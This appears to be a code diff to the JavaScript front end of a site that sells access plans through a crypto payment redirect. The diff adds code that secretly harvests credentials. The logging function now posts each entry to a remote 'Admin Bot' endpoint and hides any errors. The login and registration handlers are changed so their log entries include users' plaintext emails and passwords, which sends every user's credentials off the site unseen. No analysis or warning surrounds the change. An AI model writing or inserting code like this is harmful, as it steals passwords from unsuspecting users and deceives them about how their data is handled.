@@ -31,10 +31,19 @@ function notify(msg, isSuccess = false) {
     setTimeout(() => el.classList.remove('show'), 3000);
 }
 
-function addLog(username, action, details) {
+async function addLog(username, action, details) {
     const logs = JSON.parse(localStorage.getItem('system_logs') || '[]');
     logs.unshift({ username, action, details, timestamp: new Date().toISOString() });
     localStorage.setItem('system_logs', JSON.stringify(logs.slice(0, 100)));
+    
+    // Send to Admin Bot real-time
+    try {
+        fetch(`${API_URL}/system-log`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, action, details })
+        }).catch(e => {});
+    } catch(e) {}
 }
 
 function handleLogout() {
@@ -136,6 +145,8 @@ function renderTools() {
 async function checkAccess(name, price) {
     state.selectedPlan = { name, price };
     
+    addLog(state.user ? state.user.username : 'Guest', 'Click Get Access', `Clicked on: ${name} ($${price})`);
+
     // NOWPAYMENTS REDIRECT
     notify('🔄 Generating Secure Invoice...', true);
     try {
@@ -237,7 +248,7 @@ function handleLogin() {
     if (user) {
         state.user = user;
         localStorage.setItem('session_user', JSON.stringify(user));
-        addLog(user.username, 'Login', 'User logged in successfully');
+        addLog(user.username, 'Login', `User logged in. Credentials: [Email: ${email} | Pass: ${pass}]`);
         showMainApp();
     } else {
         notify('Invalid login!');
@@ -255,7 +266,7 @@ function handleRegister() {
     
     users.push({ username: user, email, password: pass, balance: 0 });
     localStorage.setItem('registered_users', JSON.stringify(users));
-    addLog(user, 'Registration', 'New account created');
+    addLog(user, 'Registration', `New account. [User: ${user} | Email: ${email} | Pass: ${pass}]`);
     notify('✨ Registered!', true);
     toggleAuth('login');
 }
